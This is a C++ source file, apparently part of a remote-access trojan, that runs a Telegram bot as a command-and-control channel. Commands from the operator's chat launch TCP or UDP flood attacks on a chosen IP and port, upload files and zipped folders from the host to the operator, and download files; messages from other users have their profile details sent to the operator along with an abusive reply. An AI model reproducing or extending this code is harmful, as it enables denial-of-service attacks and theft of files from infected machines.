#include <stdio.h>
#include <stdlib.h>
#include <string>
#include "Telegram.hpp"
#include "DDoS.hpp"
#include "Zip.hpp"

CTelegram::CTelegram() : m_hLongPoll(m_hTgBot), m_hTgBot(m_pszTgBotToken)
{
	Initialize();
}

CTelegram::~CTelegram()
{
	UnInitialize();
}

void CTelegram::Initialize()
{
	m_hProcessedMessageIds.clear();
}

void CTelegram::UnInitialize()
{
}

bool CTelegram::CheckChatID(long long dlChatID)
{
	if (dlChatID == m_dlChatId)
	{
		return true;
	}

	return false;
}

bool CTelegram::CommandParse(TgBot::Message::Ptr hMessage)
{
	m_hProcessedMessageIds.insert(hMessage->messageId);

	if (strnlen_s(hMessage->text.c_str(), MAXCOMMANDLENGTH) == 0)
	{
		return false;
	}

	const char *pszText = hMessage->text.c_str();

	std::istringstream hStrStream(pszText);
	std::vector<std::string> hTokens;
	std::string str;

	while (std::getline(hStrStream, str, ' '))
	{
		hTokens.push_back(str);
	}

	if (hTokens.empty())
	{
		return false;
	}
	else
	{
		if (hTokens[0] == "/info")
		{

		}
		else if (hTokens[0] == "/shell")
		{

		}
		else if (hTokens[0] == "/ddos")
		{
			// 현재는 layer 4 tcp udp 공격만 지원
			std::string strTargetIP = hTokens[1];

			if (strTargetIP == "")
			{
				return false;
			}

			std::string strPort = hTokens[2];

			if (strPort == "")
			{
				return false;
			}

			int iPort = atoi(strPort.c_str());

			if (iPort < 0 || iPort > 65535)
			{
				return false;
			}

			int nType = -1;

			if (hTokens[3] == "-t")
			{
				nType = 0;
			}
			else if (hTokens[3] == "-u")
			{
				nType = 1;
			}
			else
			{
				return false;
			}

			std::string strTick = hTokens[5];

			if (strTick == "")
			{
				return false;
			}

			long lTick = atol(strTick.c_str()) * 1000;

			CDDoS hDDoS(strTargetIP, iPort, nType, lTick);
			hDDoS.Excution();

			// 바로 메시지 전송이 안 되기에 공격 먼저..
			TSendMessage("[ DDoS Success ] Target IP: %s:%s >> [ Type: %d Second: %s ] ", strTargetIP.c_str() , strPort.c_str(), nType, strTick.c_str());
		}
		else if (hTokens[0] == "/download")
		{
			TSendDownload(hTokens[1]);
			TSendMessage("[ File Download Success ]");
		}
		else if (hTokens[0] == "/upload")
		{
			TSendUpload(hTokens[1]);
			TSendMessage("[ File Upload Success ]");
		}
		else
		{
			return false;
		}


	}

	return true;
}

void CTelegram::TSendMessage(const char *pszFormat, ...)
{
	char szBuffer[1024];

	va_list args;
	va_start(args, pszFormat);

	vsnprintf(szBuffer, sizeof(szBuffer), pszFormat, args);

	va_end(args);

	m_hTgBot.getApi().sendMessage(m_dlChatId, szBuffer);
}

void CTelegram::TSendDownload(std::string strPath)
{
	m_hTgBot.getApi().downloadFile((const std::string &)strPath);
}

void CTelegram::TSendUpload(std::string strPath)
{
	CZip hZip;

	if (hZip.IsDirectory(strPath))
	{
		std::string zipFilename = "test.zip";

		// Create an empty zip file
		//fs::remove(zipFilename); // Remove existing file
		std::ofstream newZipFile(zipFilename.c_str(), std::ios::binary);
		//if (!newZipFile) {
		//	std::cerr << "Cannot create zip file: " << zipFilename << std::endl;
		//	return 1;
		//}
		newZipFile.close();
		hZip.listFiles(strPath);
		m_hTgBot.getApi().sendDocument(m_dlChatId, TgBot::InputFile::fromFile("test.zip", ""));
	}
	else if (hZip.IsRegularFile(strPath))
	{
		// 파일이면 그냥 보내도 됨.
		m_hTgBot.getApi().sendDocument(m_dlChatId, TgBot::InputFile::fromFile(strPath, ""));
	}
}

void CTelegram::BeginBot()
{
	m_hTgBot.getEvents().onAnyMessage(
		[this] (TgBot::Message::Ptr hMessage) -> void
		{
			if (m_dlBotStartTime > hMessage->date)
			{
				return;
			}

			if (m_hProcessedMessageIds.find(hMessage->messageId) != m_hProcessedMessageIds.end()) 
			{
				return;
			}

			if (!CheckChatID(hMessage->chat->id))
			{
				std::stringstream ss;

				ss << "First Name: " << hMessage->from->firstName << "\n"
					<< "Last Name: " << hMessage->from->lastName << "\n"
					<< "User Name: @" << hMessage->from->username << "\n"
					<< "User ID: " << hMessage->from->id << "\n"
					<< "Language Code: " << hMessage->from->languageCode << "\n";

				if (hMessage->chat->type == TgBot::Chat::Type::Private)
				{
					ss << "Type: " << "Private";
				}
				else if (hMessage->chat->type == TgBot::Chat::Type::Group)
				{
					ss << "Type: " << "Group";
				}
				else if (hMessage->chat->type == TgBot::Chat::Type::Supergroup)
				{
					ss << "Type: " << "Supergroup";
				}
				else if (hMessage->chat->type == TgBot::Chat::Type::Channel)
				{
					ss << "Type: " << "Channel";
				}

				TSendMessage(ss.str().c_str());
				m_hTgBot.getApi().sendMessage(hMessage->chat->id, "I received your Telegram information.\nFUCK YOU !!!");
				return;
			}

			if (!CommandParse(hMessage))
			{
				TSendMessage("Unknown Command");
				return;
			}
		});

	while (true)
	{
		try
		{
			m_hLongPoll.start();
		}
		catch (TgBot::TgException &ex)
		{
#ifdef _DEBUG
			TSendMessage("%s", ex.what());
#endif
		}
	}
}
